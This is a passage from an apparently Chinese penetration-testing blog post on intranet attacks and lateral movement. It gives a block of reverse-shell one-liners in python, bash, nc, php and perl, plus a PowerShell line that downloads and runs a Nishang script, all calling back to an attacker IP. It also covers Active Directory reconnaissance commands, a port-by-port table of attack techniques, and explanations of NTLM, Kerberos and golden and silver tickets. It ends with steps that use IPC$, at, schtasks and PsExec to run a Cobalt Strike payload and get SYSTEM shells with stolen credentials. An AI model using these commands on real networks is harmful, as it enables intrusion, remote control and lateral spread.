start</span><br></pre></td></tr></table></figure><h2 id="socket代理"><a href="#socket代理" class="headerlink" title="socket代理"></a>socket代理</h2><p>Windows：xsocks，进行代理后，在windows下推荐使用Proxifier进行socket连接，规则自己定义</p><p>linux：</p><p>进行代理后，推荐使用proxychains进行socket连接</p><p>kali下的配置文件：<br>/etc/proxychains.conf<br>添加一条：socks5     127.0.0.1 8888</p><p>然后在命令前加proxychains就进行了代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl 192.168.111111</span><br></pre></td></tr></table></figure><h1 id="4-获取shell"><a href="#4-获取shell" class="headerlink" title="4.获取shell"></a>4.获取shell</h1><h2 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h2><p>常用一句话反弹shell：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.1.130&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/172.16.1.130/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">nc 172.16.1.130 4444 -t -e /bin/bash</span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;172.16.1.130&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.16.1.130&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh \-i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);Invoke-PowerShellTcp</span><br><span class="line">\-Reverse -IPAddress 172.16.1.130 -port 4444</span><br></pre></td></tr></table></figure><h2 id="ICMP隧道反弹shell"><a href="#ICMP隧道反弹shell" class="headerlink" title="ICMP隧道反弹shell"></a>ICMP隧道反弹shell</h2><p><a href="https://github.com/bdamele/icmpsh">工具GitHub</a></p><p>有时候防火墙可能对tcp进行来处理，然而对imcp并没有做限制的时候，可以使用icmp弹shell。</p><p>直接跑run.sh，就OK，在靶机下运行生成的命令。</p><h1 id="5-信息收集"><a href="#5-信息收集" class="headerlink" title="5.信息收集"></a>5.信息收集</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="查看当前网卡和IP信息："><a href="#查看当前网卡和IP信息：" class="headerlink" title="查看当前网卡和IP信息："></a>查看当前网卡和IP信息：</h3><p>可以看到通过查看网卡信息可以判断出当前机器是否在域内，以及是否是⼀台域机器</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317175559094.png" alt="image-20220317175559094"></p><h3 id="查看操作系统信息"><a href="#查看操作系统信息" class="headerlink" title="查看操作系统信息"></a>查看操作系统信息</h3><p><code>systeminfo</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317175921095.png" alt="image-20220317175921095"></p><p>通过查看系统的详细信息我们可以判断出当前主机是一台属于域内的机器，因为在工作组环境的机器只会显示WORKGROUP，而域则会显示域地址。</p><h3 id="查看当前登陆域及域用户"><a href="#查看当前登陆域及域用户" class="headerlink" title="查看当前登陆域及域用户"></a>查看当前登陆域及域用户</h3><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317180028774.png" alt="image-20220317180028774"></p><h3 id="查看域内时间"><a href="#查看域内时间" class="headerlink" title="查看域内时间"></a>查看域内时间</h3><p><code>net time /domain</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">运行 net time /domain 该命令后，一般会有如下三种情况:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>存在域，但当前用户不是域用户，提示说明权限不够</span><br><span class="line">  <span class="attr">C</span>:\Users&gt;bypass&gt;net time /domain</span><br><span class="line">  发生系统错误 <span class="number">5</span></span><br><span class="line">  拒绝访问。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>存在域，并且当前用户是域用户</span><br><span class="line">   <span class="attr">C</span>:\Users\Administrator&gt;net time /domain</span><br><span class="line">   \\dc.test.com 的当前时间是 <span class="number">2020</span>/<span class="number">10</span>/<span class="number">23</span> <span class="number">21</span>:<span class="number">18</span>:<span class="number">37</span></span><br><span class="line"></span><br><span class="line">   命令成功完成。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>当前网络环境为工作组，不存在域</span><br><span class="line">   <span class="attr">C</span>:\Users\Administrator&gt;net time /domain</span><br><span class="line">   找不到域 WORKGROUP 的域控制器。</span><br></pre></td></tr></table></figure><p>查找域</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317182421455.png" alt="image-20220317182421455"></p><h3 id="查找域内所有计算机"><a href="#查找域内所有计算机" class="headerlink" title="查找域内所有计算机"></a>查找域内所有计算机</h3><p><code>net view /domain GHOST</code></p><h3 id="查询域内所有用户组列表-默认13个"><a href="#查询域内所有用户组列表-默认13个" class="headerlink" title="查询域内所有用户组列表(默认13个)"></a>查询域内所有用户组列表(默认13个)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><h3 id="查询所有域成员计算机列表"><a href="#查询所有域成员计算机列表" class="headerlink" title="查询所有域成员计算机列表"></a>查询所有域成员计算机列表</h3><p><code>net group &quot;domain computer&quot; /domain</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317182701533.png" alt="image-20220317182701533"></p><h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h3><p><code>nltest /dclist:ghost</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183428519.png" alt="image-20220317183428519"></p><h3 id="查看域控制器的主机名"><a href="#查看域控制器的主机名" class="headerlink" title="查看域控制器的主机名"></a>查看域控制器的主机名</h3><p><code>Nslookup -type=SRV _ldap._tcp</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183743360.png" alt="image-20220317183743360"></p><h3 id="查看域控制器"><a href="#查看域控制器" class="headerlink" title="查看域控制器"></a>查看域控制器</h3><p><code>net group &quot;domain controllers&quot; /doamin</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183912489.png" alt="image-20220317183912489"></p><h3 id="查询域管理员列表"><a href="#查询域管理员列表" class="headerlink" title="查询域管理员列表"></a>查询域管理员列表</h3><p><code>net group &quot;domain admins&quot; /domain</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317184120741.png" alt="image-20220317184120741"></p><h3 id="获取所有域用户列表"><a href="#获取所有域用户列表" class="headerlink" title="获取所有域用户列表"></a>获取所有域用户列表</h3><p><code>net group &quot;domain users&quot; /domain</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317184213265.png" alt="image-20220317184213265"></p><h3 id="nltest查询信任域"><a href="#nltest查询信任域" class="headerlink" title="nltest查询信任域"></a>nltest查询信任域</h3><p>信任域：可以在工作组里查询，查询内网里是否有域环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yutaowin10&gt;nltest /domain_trusts /all_trusts  /v /server:192.168.188.100</span><br><span class="line">域信任的列表:</span><br><span class="line">    0: GHOST ghost.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">       Dom Guid: 9212c4c0-c5ea-49ff-9d48-84fa55b8d0a8</span><br><span class="line">       Dom Sid: S-1-5-21-1238213221-2393825874-2881136966</span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure><p>返回所有信任192.168.188.100的域</p><p><code>nltest /dsgetdc:ghost /server:192.168.188.100</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yutaowin10&gt;nltest /dsgetdc:ghost /server:192.168.188.100</span><br><span class="line">           DC: \\WIN-4JS3YOGGQ2T</span><br><span class="line">      地址: \\192.168.188.100</span><br><span class="line">     Dom Guid: 9212c4c0-c5ea-49ff-9d48-84fa55b8d0a8</span><br><span class="line">     Dom 名称: GHOST</span><br><span class="line">  林名称: ghost.com</span><br><span class="line"> DC 站点名称: Default-First-Site-Name</span><br><span class="line">我们的站点名称: Default-First-Site-Name</span><br><span class="line">        标志: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET</span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure><h2 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h2><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击技巧</th></tr></thead><tbody><tr><td>21/22/69</td><td>ftp/tftp：文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic</td><td>Java反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere控制台</td><td>爆破：控制台弱口令\Java反序列</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破\未授权访问</td></tr></tbody></table><h1 id="6-Windows认证协议"><a href="#6-Windows认证协议" class="headerlink" title="6.Windows认证协议"></a>6.Windows认证协议</h1><p>Windows主要使用NTLM和kerberos认证</p><h2 id="1-NTLM认证"><a href="#1-NTLM认证" class="headerlink" title="1.NTLM认证"></a>1.NTLM认证</h2><blockquote><p>  <a href="https://zhuanlan.zhihu.com/p/79196603">NTLM认证</a></p></blockquote><p>NTLM是NT LAN Manager的缩写，NTLM是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。</p><p>Windows 中是不保存明文密码的，只会保存密码的哈希值。 其中本机用户的密码哈希是放在 本地的 SAM 文件 里面，域内用户的密码哈希是存在域控的 NTDS.dit 文件 里面.</p><p>eg：<code>Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</code></p><p>其中<code>AAD3B435B51404EEAAD3B435B51404EE</code>是LM Hash，<code>31D6CFE0D16AE931B73C59D7E0C089C0</code>是NTLM Hash。</p><p>NTLM 协议的认证过程有三步：</p><ul><li>  <strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li><li>  <strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li><li>  <strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li></ul><h3 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a>LM hash</h3><p>计算方法：</p><p>1.密码转为大写，转换为16进制字符串，不足14字节将会用0来再后面补全。</p><p>2.密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</p><p>3.再分7bit为一组,每组末尾加0，再组成一组</p><p>4.上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p><p>5.将加密后的两组拼接在一起，得到最终LM HASH值。</p><h3 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h3><p>从Windows Vista 和 Windows Server 2008开始，默认情况下只存储 NTLM Hash，LM Hash 将不再存在。。</p><p>如果空密码或者不储蓄 LM Hash 的话，我们抓到的LM Hash是<code>AAD3B435B51404EEAAD3B435B51404EE</code>。所以在 Windows 7 中我们看到抓到 LM Hash 都是<code>AAD3B435B51404EEAAD3B435B51404EE</code>，这里的 LM Hash 已经没有任何价值了。</p><p>NTLM hash计算方法：</p><ul><li>  1.先将用户密码转换为十六进制格式。</li><li>  2.将十六进制格式的密码进行Unicode编码。</li><li>  3.使用MD4摘要算法对Unicode编码数据进行Hash计算</li></ul><p>NTLM认证分为本地认证和网络认证。</p><p>有三个版本， NTLMv1 、NTLMv2 、NTLMsession v2 三个版本，目前使用最多的是NTLMv2版本。</p><h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p><blockquote><p>  SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code></p></blockquote><p>当用户输入密码进行本地认证的过程中，用户输入的密码将为被转化为 NTLM Hash，然后与SAM中的NTLM Hash进行比较。当用户注销、重启、锁屏后，操作系统会让 <strong>winlogon.exe</strong> 显示登录界面（输入框）。当 winlogon.exe 接收输入后，会将密码交给lsass进程。<strong>lsass.exe</strong> 是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略，这个进程中会存一份明文密码，将明文密码加密成 NTLM Hash，对SAM数据库比较认证。</p><blockquote><p>  winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</p></blockquote><p>Net-NTLM Hash v1的格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure><p>Net-NTLM Hash v2的格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><p>客户端发送用户名等身份信息，服务端生成随机16位challenge发给客户端，客户端使用NTLM hash加密challenge发给服务端。服务端通过用户名找到NTLM hash然后加密challenge跟客户端发送过来的比对，比对成功则认证成功。</p><h4 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h4><p>这种情况适用于使用域账号登录的场景，这个时候服务端是没有用户的hash的。所以不一样的地方是服务端会将用户信息、challenge、客户端返回的信息都发给域控，由域控做认证再返回结果。流程图见下图</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1619093645_6081688d6fe4ca32a240d.png!small" alt="1619093645_6081688d6fe4ca32a240d.png!small?1619093647476"></p><h2 id="2-kerberos认证"><a href="#2-kerberos认证" class="headerlink" title="2.kerberos认证"></a>2.kerberos认证</h2><p>Kerberos认证的是由三方来完成的，他们分别是client、server、KDC(Key Distribution Center密钥分发中心)</p><p>KDC 服务默认会安装在一个域的域控中，而 Client 和 Server 为域内的用户或者是服务，如 HTTP 服务，SQL 服务。在 Kerberos 中 Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来决定。</p><p>其中KDC是由两种服务所构成的：</p><ul><li><p>  AS(Authentication Service)：验证 Client 端的身份，验证通过就会给一张 TGT（Ticket Granting Ticket）票给 Client。</p></li><li><p>  TGS(Ticket Granting Service)：通过 AS 发送给 Client 的票（TGT）换取访问 Server 端的票ST（ServiceTicket）也有资料称为 TGS Ticket，为了和 TGS 区分，在这里就用 ST 来说明。</p></li></ul><p>AS是用来为client生成TGT(Ticket Granting Ticket)的，TGS是用来为client生成某个服务的ST的，TGT是用来获取ST的临时凭证，ST是用来访问某种服务所必须使用的票据。</p><p>KDC 服务框架中包含一个krbtgt账户，它是在创建域时系统自动创建的一个账号，你可以暂时理解为他就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</p><h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1619093657_60816899201be08a4b1ab.png!small" alt="1619093657_60816899201be08a4b1ab.png!small?1619093659321"></p><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块：</p><p><strong>The Authentication Service Exchange</strong>：Client 与 AS 的交互；</p><p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client 与 TGS 的交互；</p><p><strong>The Client/Server Authentication Exchange</strong>：Client 与 Server 的交互。</p><ol><li><p>client与AS：</p><p> client发送： 用户名 + 用户密码加密（用户信息，时间戳等）</p><p> AS：根据用户名找到用户密码，解密出用户信息和事件戳，核实成功后认证成功，然后随机生成一个session key</p><p> AS发送：用户密码加密（session key） + TGT(也就是krbtgt加密（用户信息，session key）)</p><p> 注意：TGT中用户唯一不知道的是krbtgt的密码hash，所以有了这个hash，就可以自己伪造TGT，也就是所谓的<strong>金票据</strong>。</p></li><li><p>client与TGS交互</p><p> client发送：session key加密（用户信息，时间戳等） + 需要访问的服务名 + TGT</p><p> TGS：使用krbtgt密码解密TGT，获得session key 解密出用户信息，与TGS中的用户信息比对。认证成功后生成随机的 server session key</p><p> TGS发送：session key加密（server session key） + ST(也就是对应服务端密码加密（用户信息，server session key）)</p><p> 注意：ST中用户唯一不知道的是server的密码hash，所以有了这个hash，就可以自己伪造ST，也就是所谓的<strong>银票据</strong>。</p></li><li><p>client与server交互</p><p> client发送：server session key加密（用户信息，时间戳等） + ST</p><p> server：使用自己的密码解密ST，获得server session key，然后将server session key解密后获得的用户信息和ST中的用户信息比对，认证成功。</p></li></ol><h2 id="3-PAC-特权属性证书"><a href="#3-PAC-特权属性证书" class="headerlink" title="3.PAC(特权属性证书)"></a>3.PAC(特权属性证书)</h2><p>在 Kerberos 最初设计的几个流程里说明了如何证明 Client 是 Client 而不是由其他人来冒充的，但并没有声明 Client 有没有访问 Server 服务的权限，因为在域中不同权限的用户能够访问的资源是有区别的。<br>所以微软为了解决这个问题在实现 Kerberos 时加入了 PAC 的概念，PAC 的全称是 Privilege Attribute Certificate(特权属性证书)。可以理解为火车有一等座，也有二等座，而 PAC 就是为了区别不同权限的一种方式。</p><h1 id="7-横向移动总结"><a href="#7-横向移动总结" class="headerlink" title="7.横向移动总结"></a>7.横向移动总结</h1><h2 id="Windows远程连接命令"><a href="#Windows远程连接命令" class="headerlink" title="Windows远程连接命令"></a>Windows远程连接命令</h2><h3 id="IPC连接"><a href="#IPC连接" class="headerlink" title="IPC连接"></a>IPC连接</h3><p>条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.开放了139、445端口；</span><br><span class="line">2.目标开启ipc$文件共享；</span><br><span class="line">3.获取用户账号密码；</span><br></pre></td></tr></table></figure><p>ipc+计划任务恒横向移动：</p><p>（1）首先建立向目标主机的<code>IPC$</code>连接</p><p>（2）命令执行的脚本传到目标主机</p><p>（3）创建计划任务在目标机器上执行命令脚本</p><p>（4）删除<code>IPC$</code>连接</p><p><strong>连接</strong>：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319141047308.png" alt="image-20220319141047308"></p><p><strong>映射</strong>：</p><p><code>net use z: \\192.168.188.100\c$ Admin123! /user:Administrator</code>（把目标C盘映射到本地z盘）</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319141844900.png" alt="image-20220319141844900"></p><p><strong>访问/删除路径</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\192.168.188.100\c$   #直接访问</span><br><span class="line">net use c: /del                 删除映射的c盘，其他盘类推 </span><br><span class="line">net use * /del                 删除全部,会有提示要求按y确认</span><br></pre></td></tr></table></figure><p><strong>删除IPC连接</strong>：</p><p><code>net use \\192.168.188.100\ipc$ /del</code></p><h3 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h3><blockquote><p>  at 命令是Windows自带的用于创建计划任务的命令，但是at 命令只在2003及以下的版本使用。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。</p></blockquote><p>at计划命令在实战中主要有两个用处：一是在获取webshell后不能够执行系统命令的情况下可以用at命令将命令执行后写入txt再用type读取，二是利用at计划任务命令上线cs或者msf</p><p>因为at只在2003以下，这里使用win2003（）的机子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.188.100 14:27:00 cmd.exe /c &quot;ipconig &gt; c:\result.txt&quot;</span><br></pre></td></tr></table></figure><p>之后使用type读取</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319143430449.png" alt="image-20220319143430449"></p><p>一定要注意主机的时间，使用<code>net time \\192.168.188.100</code>查看</p><p><strong>删除计划任务</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> <span class="number">1</span> /<span class="keyword">delete</span></span><br></pre></td></tr></table></figure><h3 id="schtash命令"><a href="#schtash命令" class="headerlink" title="schtash命令"></a>schtash命令</h3><p>2008及以上都没at了，使用schtash代替。</p><p>可以直接将cs的exe copy到目标机：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\xxxx\artifact.exe \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span>\c$</span><br></pre></td></tr></table></figure><p>之后使用schtash创建计划任务：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /TN cs /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span> /TR C:\artifact.exe /SC once /ST <span class="number">17</span>:<span class="number">32</span></span><br><span class="line"></span><br><span class="line">/TN 指定任务的名称</span><br><span class="line">/s 指定远程计算机的名称或 IP 地址</span><br><span class="line">/TR 指定任务运行的程序或命令</span><br><span class="line">/SC 指定计划类型。 </span><br><span class="line">/ST 使用<span class="number">24</span>小时时间格式 HH： mm 指定任务的开始时间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看帮助</span><br><span class="line">schtasks /create /?</span><br><span class="line"></span><br><span class="line">执行计划任务</span><br><span class="line">schtasks /run /tn cs /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span></span><br><span class="line"></span><br><span class="line">查看运行状态</span><br><span class="line">schtasks /query /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span> | findstr <span class="string">&quot;cs&quot;</span></span><br><span class="line"></span><br><span class="line">删除</span><br><span class="line">schtasks /<span class="keyword">delete</span> /F /tn todayfive /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span></span><br><span class="line">/f 禁止显示确认消息。 删除任务但不发出警告</span><br></pre></td></tr></table></figure><h2 id="使用PsExec"><a href="#使用PsExec" class="headerlink" title="使用PsExec"></a>使用PsExec</h2><p>微软自家的，不会被杀</p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">tool_download</a></p><p>需要远程系统开启admin共享（默认是开启的），原理是基于IPC共享，目标需要开放445端口和admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -accepteula \\192.168.188.100 -u WIN-4JS3YOGGQ2T\administrator -p Admin123! -s cmd.exe</span><br><span class="line"></span><br><span class="line">-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line">-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell</span><br></pre></td></tr></table></figure><p>也可以net连上之后psexec：</p><figure class="highlight 